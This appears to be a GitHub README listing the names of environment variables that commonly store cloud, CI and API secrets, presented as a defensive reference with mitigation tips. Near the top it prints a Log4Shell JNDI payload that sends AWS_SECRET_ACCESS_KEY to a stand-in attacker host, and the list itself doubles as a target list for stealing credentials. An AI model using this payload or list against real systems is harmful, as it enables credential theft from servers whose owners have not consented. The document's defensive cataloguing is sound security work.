**🤝 Show your support - give a ⭐️ if you liked the content**

---

# **Awesome list of secrets in environment variables [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)**

# 📝 Description

List of secrets, passwords, API keys, tokens stored inside a system environment variables.

**An environment variable** is a variable whose value is set outside the program, typically through functionality built into the operating system or microservice.

Many developer documentations recommends storing secrets inside an environment variable, but is it the best way to keep secrets?

The attacker can read values inside system environment variable by using exploits:
- CVE-2021-44228 JNDI log4j (JAVA) ([Read more...](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#1-system-environment-variables))
 
  `${jndi:ldap://somesitehackerofhell.com/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}`

  Get **AWS_SECRET_ACCESS_KEY** or return **NO_EXISTS**
- CVE-XXXX-XXXX Web browser attack (Writeup/POC coming soon to my Github - Follow me on [Github](https://github.com/Puliczek) and [Twitter](https://twitter.com/pulik_io) 😉
- and much more...

Because of that I created, a list of secrets in environment variables to help secure software. 

Some of practices to avoid leak of secrets stored in environment variables is to:
- Block/notify on WAF when the request includes system environment variables
- Store in system environment variable path to a config file, instead of clean value
- Encrypt values inside environment variable
- Use different way to store secrets 🤓

![Environment variables](https://user-images.githubusercontent.com/12344862/147656611-8726c036-128b-4ad4-a19b-c019c2d6b1ea.png)


You can check your system environment variables:
- Windows execute in PowerShell: `dir env:`
- Linux/MacOS execute in terminal: `printenv` or `env`


# **Awesome list of secrets in environment variables**
# A
## AWS
- AWS_ACCESS_KEY_ID
- AWS_SECRET_ACCESS_KEY
- AMAZON_AWS_ACCESS_KEY_ID
- AMAZON_AWS_SECRET_ACCESS_KEY
  
source: https://docs.aws.amazon.com/sdkref/latest/guide/setting-global-aws_secret_access_key.html
## Azure
- AZURE_CLIENT_ID
- AZURE_CLIENT_SECRET
- AZURE_USERNAME
- AZURE_PASSWORD
- MSI_ENDPOINT
- MSI_SECRET
  
source: https://docs.microsoft.com/en-us/dotnet/api/azure.identity.environmentcredential?view=azure-dotnet
<br>
source: https://techcommunity.microsoft.com/t5/azure-developer-community-blog/understanding-azure-msi-managed-service-identity-tokens-caching/ba-p/337406
# B
## Binance
- binance_api
- binance_secret
  
source: https://algotrading101.com/learn/binance-python-api-guide/

## Bittrex
- BITTREX_API_KEY
- BITTREX_API_SECRET

source: https://github.com/TeamWertarbyte/crypto-trading-bot/blob/development/README.md
# C
## CircleCI
- CIRCLE_TOKEN

source: https://circleci.com/docs/2.0/api-developers-guide/
# D
## Digitalocean
- DIGITALOCEAN_ACCESS_TOKEN
  
source: https://github.com/digitalocean/doctl#authenticating-with-digitalocean

## Dockerhub
- DOCKERHUB_PASSWORD

source: https://circleci.com/docs/2.0/env-vars/
# E
# F
## Fastlane products
- ITC_PASSWORD 

source: https://github.com/phatblat/fastlane-variables
## Facebook 
- FACEBOOK_APP_ID
- FACEBOOK_APP_SECRET
- FACEBOOK_ACCESS_TOKEN


# G
## Github
- GH_TOKEN
- GITHUB_TOKEN 
- GH_ENTERPRISE_TOKEN
- GITHUB_ENTERPRISE_TOKEN 

source: https://cli.github.com/manual/gh_help_environment 
## Google Cloud
- GOOGLE_APPLICATION_CREDENTIALS
- GOOGLE_API_KEY
  
source: https://cloud.google.com/docs/authentication/getting-started#windows

## Gitlab
- CI_DEPLOY_USER
- CI_DEPLOY_PASSWORD
- GITLAB_USER_LOGIN
- CI_JOB_JWT
- CI_JOB_JWT_V2
- CI_JOB_TOKEN

source: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html
# H
# I
# J
# K
# L
# M
## Mailgun
- MAILGUN_API_KEY
  
source: https://www.pulumi.com/registry/packages/mailgun/installation-configuration/

## MongoDB
- MCLI_PRIVATE_API_KEY
- MCLI_PUBLIC_API_KEY

https://docs.mongodb.com/mongocli/stable/configure/environment-variables/
# N

## NPM
- NPM_TOKEN 

source: https://docs.npmjs.com/using-private-packages-in-a-ci-cd-workflow

# O
## OpenStack command-line client
- OS_PASSWORD

source: [https://docs.openstack.org/ocata/user-guide/common/cli-set-environment-variables-using-openstack-rc.html](https://docs.openstack.org/ocata/user-guide/common/cli-set-environment-variables-using-openstack-rc.html)
# P
## Percy.io
- PERCY_TOKEN

source: https://docs.percy.io/docs/environment-variables
# Q
# R
# S
## Sentry
- SENTRY_AUTH_TOKEN

source: https://docs.sentry.io/product/cli/configuration/

## Slack
- SLACK_TOKEN

source: https://slack.dev/node-slack-sdk/getting-started

## Square
- square_access_token
- square_oauth_secret

source: https://www.npmjs.com/package/square/v/12.0.0?activeTab=readme

## Stripe
- STRIPE_API_KEY
- STRIPE_DEVICE_NAME

source: https://stripe.com/docs/cli/api_keys

# T
## Twilio
- TWILIO_ACCOUNT_SID
- TWILIO_AUTH_TOKEN 

Source: https://www.twilio.com/blog/2017/01/how-to-set-environment-variables.html

## Twitter
- CONSUMER_KEY
- CONSUMER_SECRET

source: https://developer.twitter.com/en/docs/authentication/guides/authentication-best-practices
# U
# V
## Vault HashiCorp
- VAULT_TOKEN
- VAULT_CLIENT_KEY
  
source: https://www.vaultproject.io/docs/commands
# W
# X
# Y
# Z

## Get RAW list:

1. Get raw README.md: https://raw.githubusercontent.com/Puliczek/awesome-list-of-secrets-in-environment-variables/main/README.md
2. Copy to 'text' in https://onlinetexttools.com/filter-text
3. Use a Regular Expresision: <br>
   ^-\s(\w*)\s*$
4. It's done 😉
   
# 😎 Contributing
👍🎉 First off, thanks for taking the time to contribute! 🎉👍

If you would like to add more secrets:
<br>
[Please read and follow our Contributing guide](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables/blob/main/CONTRIBUTING.md)

Thanks! 🦄

# 💻 Useful links

- [Stackoverflow - Is it secure to store passwords as environment variables (rather than as plain text) in config files?](https://stackoverflow.com/questions/12461484/is-it-secure-to-store-passwords-as-environment-variables-rather-than-as-plain-t)
- [Google - Best practices for securely using API keys](https://support.google.com/googleapi/answer/6310037?hl=en)
- [An Introduction to Environment Variables and How to Use Them](https://medium.com/chingu/an-introduction-to-environment-variables-and-how-to-use-them-f602f66d15fa)
- [Why you shouldn't use ENV variables for secret data](https://diogomonica.com/2017/03/27/why-you-shouldnt-use-env-variables-for-secret-data/)
- [The Triumph and Tragedy of .env Files](https://blog.doppler.com/the-triumph-and-tragedy-of-env-files)

# 🤝 Show your support

**Give a ⭐️ if you liked the content**

# ✔️ Disclaimer
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
